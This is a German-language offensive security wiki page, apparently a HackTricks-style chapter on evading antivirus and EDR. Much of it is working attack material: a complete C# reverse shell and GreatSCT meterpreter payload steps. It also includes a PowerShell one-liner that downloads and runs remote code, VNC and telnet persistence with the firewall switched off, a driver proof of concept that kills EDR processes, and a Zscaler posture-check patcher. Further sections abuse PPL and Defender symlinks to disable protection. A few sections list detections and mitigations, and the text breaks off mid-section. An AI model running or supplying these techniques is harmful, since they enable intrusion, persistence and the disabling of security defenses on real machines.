Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten erlaubt, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (bypassed) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** des Userspace-Prozesses so zu verändern, dass sie sofort ohne Protokollierung zurückkehrt. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass ETW-Logging für diesen Prozess effektiv deaktiviert wird.

Weitere Informationen findest du in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist schon seit einiger Zeit bekannt und ist weiterhin eine sehr gute Methode, um deine post-exploitation Tools auszuführen, ohne von AV entdeckt zu werden.

Da das payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir nur darauf achten, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Ansätze:

- **Fork\&Run**

Dabei wird **ein neuer, opferhafter Prozess erzeugt**, dein post-exploitation bösartiger Code in diesen neuen Prozess injiziert, dein Code ausgeführt und nach Beendigung der neue Prozess beendet. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantatprozesses stattfindet. Das bedeutet, wenn bei einer post-exploitation Aktion etwas schiefgeht oder entdeckt wird, besteht eine **viel größere Chance**, dass unser **Implantat überlebt.** Der Nachteil ist, dass du eine **größere Chance** hast, durch **Behavioural Detections** erwischt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. So kannst du vermeiden, einen neuen Prozess zu erstellen und diesen von AV scannen zu lassen, aber der Nachteil ist, dass wenn bei der Ausführung des payload etwas schiefgeht, die **Chance viel größer** ist, dein Beacon zu verlieren, da es abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem der kompromittierten Maschine Zugriff auf die Interpreter-Umgebung gewährt wird, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist.

Indem man Zugriff auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo weist darauf hin: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP etc. haben wir **mehr Flexibilität, um statische Signaturen zu umgehen**. Tests mit zufälligen nicht-obfuskierten reverse shell Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, mit der ein Angreifer das Zugriffstoken oder ein Sicherheitsprodukt wie ein EDR oder AV manipulieren kann, um dessen Privilegien zu reduzieren, sodass der Prozess nicht beendet wird, aber nicht die Berechtigungen hat, nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **verhindern, dass externe Prozesse** Handles auf die Token von Sicherheitsprozessen erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu deployen und es dann zu nutzen, um die Maschine zu übernehmen und Persistenz aufrechtzuerhalten:
1. Lade von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer auf dem Opfer still (Administrator benötigt) aus: `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehe zurück zur Chrome Remote Desktop Seite und klicke auf Weiter. Der Assistent wird dich dann zur Autorisierung auffordern; klicke auf die Authorize-Schaltfläche, um fortzufahren.
4. Führe die angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Hinweis auf den pin-Parameter, mit dem sich die PIN einstellen lässt, ohne die GUI zu verwenden).


## Advanced Evasion

Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, daher ist es nahezu unmöglich, in reifen Umgebungen vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in weiterführende Advanced Evasion Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in der Tiefe.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile des Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt und es dir aufschlüsselt.\
Ein weiteres Tool, das **das Gleiche macht, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Web-Service unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows 10 hatten alle Windows-Versionen einen **Telnet-Server**, den man (als Administrator) installieren konnte, indem man:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es **starten**, wenn das System gestartet wird, und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet-Port ändern** (stealth) und Firewall deaktivieren:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du möchtest die bin-Downloads, nicht das Setup)

**ON THE HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege ein Passwort in _VNC Password_ fest
- Lege ein Passwort in _View-Only Password_ fest

Dann verschiebe das Binary _**winvnc.exe**_ und die neu erstellte Datei _**UltraVNC.ini**_ auf die **victim**

#### **Reverse connection**

Der **attacker** sollte in seinem **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es vorbereitet ist, eine reverse VNC connection abzufangen. Dann, auf der **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um stealth zu wahren, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führe nicht `winvnc -h` zur Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starte nun den **lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** mit folgendem Befehl aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste von C#-Obfuskatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Python zum Erstellen von Injectoren verwenden:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR im Kernel-Space deaktivieren

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen vor dem Deployment von Ransomware zu deaktivieren. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Wichtigste Erkenntnisse
1. **Signed driver**: Die auf die Festplatte abgelegte Datei ist `ServiceMouse.sys`, aber das Binary ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Weil der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Dienst** und die zweite startet ihn, sodass `\\.\ServiceMouse` vom Userland aus erreichbar ist.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beendet einen beliebigen Prozess per PID (wird verwendet, um Defender/EDR-Dienste zu stoppen) |
| `0x990000D0` | Löscht eine beliebige Datei auf der Festplatte |
| `0x990001D0` | Entlädt den Treiber und entfernt den Dienst |

Minimaler C-Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *protected* Prozesse öffnen, diese beenden oder mit Kernel-Objekten manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmechanismen.

Detection / Mitigation
•  Aktivieren Sie Microsofts Vulnerable-Driver-Blockliste (`HVCI`, `Smart App Control`), sodass Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie das Anlegen neuer *Kernel*-Dienste und alarmieren Sie, wenn ein Treiber aus einem world-writable Verzeichnis geladen wird oder nicht auf der Allow-List steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** führt device-posture-Regeln lokal aus und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu kommunizieren. Zwei schwache Designentscheidungen machen eine vollständige Umgehung möglich:

1. Die Posture-Evaluierung findet **vollständig clientseitig** statt (ein Boolean wird an den Server gesendet).  
2. Interne RPC-Endpunkte prüfen nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch das **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung compliant ist |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen auf dem Tunnel | Kurzgeschlossen |

Minimaler Ausschnitt des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** Posture-Checks zeigen **grün/konform**.
* Nicht signierte oder modifizierte Binärdateien können Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur gleich- oder höherstufige geschützte Prozesse sich gegenseitig manipulieren können. Aus offensiver Sicht: Wenn du eine PPL-fähige Binärdatei legal starten und ihre Argumente kontrollieren kannst, kannst du harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, von PPL abgesichertes Schreib-Primitive gegen geschützte Verzeichnisse von AV/EDR verwandeln.

Was dazu führt, dass ein Prozess als PPL läuft
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibles Schutzlevel muss angefordert werden, das zum Signer der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen zu einem Fehler bei der Erstellung.

Siehe auch eine allgemeine Einführung zu PP/PPL- und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tooling
- Open-Source-Helfer: CreateProcessAsPPL (wählt das Schutzlevel und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Nutzungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-Primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht verarbeiten; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu zeigen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` mithilfe eines Launchers (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Logpfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zielbinary während der Ausführung normalerweise vom AV geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Boot, bevor der AV startet, indem du einen Autostart-Service installierst, der verlässlich früher läuft. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt wird und ein Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen geschwärzt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nicht außer dem Speicherort kontrollieren; das Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokale Administrator-/SYSTEM-Rechte, um einen Dienst zu installieren/zu starten, sowie ein Fenster für einen Neustart.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Erkennungen
- Erzeugung des Prozesses `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders mit nicht-standardmäßigen Elternprozessen, rund um den Boot.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binaries automatisch starten und konsequent vor Defender/AV starten. Untersuchen Sie Dienst-Erstellung/-Änderungen vor Defender-Startup-Fehlern.
- Integritätsüberwachung von Defender-Binaries/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und anomalem PPL-Level-Einsatz durch Nicht-AV-Binaries.

Gegenmaßnahmen
- WDAC/Code Integrity: Beschränken Sie, welche signierten Binaries als PPL laufen dürfen und unter welchen Elternprozessen; blockieren Sie ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie das Erstellen/Ändern von Auto-Start-Diensten und überwachen Sie Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender-Tamper-Schutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startup-Fehler, die auf Binary-Korruption hinweisen.
- Erwägen Sie, die 8.3-Kurznamen-Generierung auf Volumes, die Security-Tools hosten, zu deaktivieren, falls mit Ihrer Umgebung kompatibel (gründlich testen).

Referenzen zu PPL und Tools
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender durch Platform Version Folder Symlink Hijack

Windows Defender wählt die Platform, aus der es ausgeführt wird, indem es die Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

aufzählt.

Es wählt den Unterordner mit dem lexikographisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet die Defender-Serviceprozesse von dort (aktualisiert entsprechend die Service-/Registry-Pfade). Diese Auswahl vertraut Verzeichnis-Einträgen einschließlich directory reparse points (symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzulenken und DLL-Sideloading oder Dienststörungen zu erreichen.

Voraussetzungen
- Lokaler Administrator (benötigt, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit zum Neustart oder zum Auslösen der Defender-Platform-Neuauswahl (Dienstneustart beim Boot)
- Nur eingebaute Tools erforderlich (mklink)

Warum es funktioniert
- Defender blockiert Schreibzugriffe in seine eigenen Ordner, aber seine Platform-Auswahl vertraut Verzeichnis-Einträgen und wählt die lexikographisch höchste Version, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauten Pfad aufgelöst wird.

Schritt-für-Schritt (Beispiel)
1) Bereiten Sie einen beschreibbaren Klon des aktuellen Platform-Ordners vor, z. B. `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle einen Symlink zu einem Verzeichnis mit höherer Version innerhalb von Platform, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auswahl des Triggers (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` und die Servicekonfiguration/Registry sehen, die diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Ablegen/Ersetzen von DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in Defender-Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegienerweiterung bietet; sie erfordert admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams können runtime evasion aus dem C2 implant in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs durch attacker-controlled, position‑independent code (PIC) routen. Das verallgemeinert Evasion über die kleine API‑Oberfläche hinaus, die viele Kits exponieren (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
